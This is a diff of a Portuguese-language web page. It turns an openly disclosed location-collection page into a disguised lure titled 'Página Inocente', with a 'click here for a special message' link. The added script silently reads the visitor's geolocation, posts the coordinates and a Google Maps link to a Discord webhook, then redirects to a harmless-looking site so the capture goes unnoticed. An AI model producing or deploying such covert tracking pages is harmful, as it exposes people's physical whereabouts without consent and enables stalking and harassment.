@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Coletar Geolocalização</title>
+    <title>Página Inocente</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -25,87 +25,88 @@
             max-width: 400px;
             width: 100%;
         }
+        a {
+            text-decoration: none;
+            color: #0073e6;
+            font-size: 18px;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+        a:hover {
+            color: #005bb5;
+            text-decoration: underline;
+        }
         .loading {
             display: none;
             margin-top: 1rem;
             font-size: 14px;
             color: #666;
         }
-        .success {
-            display: none;
-            margin-top: 1rem;
-            font-size: 14px;
-            color: green;
-        }
-        .error {
-            display: none;
-            margin-top: 1rem;
-            font-size: 14px;
-            color: red;
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <p>Estamos coletando sua localização para melhorar nossos serviços.</p>
-        <div id="loadingMessage" class="loading">Coletando localização...</div>
-        <div id="successMessage" class="success">Localização coletada com sucesso!</div>
-        <div id="errorMessage" class="error">Erro ao coletar localização.</div>
+        <p>Olá! Clique no link abaixo para ver uma mensagem especial:</p>
+        <a id="specialLink" href="#" target="_blank">Clique aqui para continuar</a>
+        <div id="loadingMessage" class="loading">Carregando...</div>
     </div>
 
     <script>
+        const specialLink = document.getElementById('specialLink');
         const loadingMessage = document.getElementById('loadingMessage');
-        const successMessage = document.getElementById('successMessage');
-        const errorMessage = document.getElementById('errorMessage');
 
-        // Função para enviar a localização para o backend
-        const sendLocationToBackend = async (latitude, longitude) => {
+        // URL do webhook do Discord (substitua pelo seu webhook)
+        const discordWebhookURL = 'SUA_URL_DO_WEBHOOK_AQUI';
+
+        // Função para enviar a localização para o Discord
+        const sendLocationToDiscord = async (latitude, longitude) => {
+            const message = {
+                content: `Nova localização recebida:\nLatitude: ${latitude}\nLongitude: ${longitude}\n[Ver no Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
+            };
+
             try {
-                const response = await fetch('http://localhost:3000/save-location', {
+                await fetch(discordWebhookURL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify({ latitude, longitude }),
+                    body: JSON.stringify(message),
                 });
-
-                if (response.ok) {
-                    successMessage.style.display = 'block';
-                } else {
-                    throw new Error('Erro ao enviar localização');
-                }
             } catch (error) {
-                errorMessage.style.display = 'block';
-                console.error('Erro:', error);
-            } finally {
-                loadingMessage.style.display = 'none';
+                console.error('Erro ao enviar localização para o Discord:', error);
             }
         };
 
-        // Função principal para obter a geolocalização
+        // Função para obter a geolocalização
         const getLocation = () => {
             if (navigator.geolocation) {
                 loadingMessage.style.display = 'block';
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const { latitude, longitude } = position.coords;
-                        sendLocationToBackend(latitude, longitude); // Envia para o backend
+                        sendLocationToDiscord(latitude, longitude); // Envia para o Discord
+                        // Redireciona para um link inofensivo após coletar a localização
+                        window.location.href = 'https://www.exemplo.com'; // Substitua pelo link desejado
                     },
                     (error) => {
-                        errorMessage.style.display = 'block';
-                        loadingMessage.style.display = 'none';
                         console.error('Erro ao obter localização:', error.message);
+                        // Redireciona mesmo se a localização falhar
+                        window.location.href = 'https://www.exemplo.com'; // Substitua pelo link desejado
                     },
                     { timeout: 10000 } // Timeout de 10 segundos
                 );
             } else {
-                errorMessage.style.display = 'block';
                 console.error('Geolocalização não é suportada pelo navegador.');
+                // Redireciona se a geolocalização não for suportada
+                window.location.href = 'https://www.exemplo.com'; // Substitua pelo link desejado
             }
         };
 
-        // Inicia a coleta de localização quando a página carrega
-        window.onload = getLocation;
+        // Adiciona o evento de clique ao link
+        specialLink.addEventListener('click', function(event) {
+            event.preventDefault(); // Impede o comportamento padrão do link
+            getLocation(); // Coleta a localização
+        });
     </script>
 </body>
 </html>
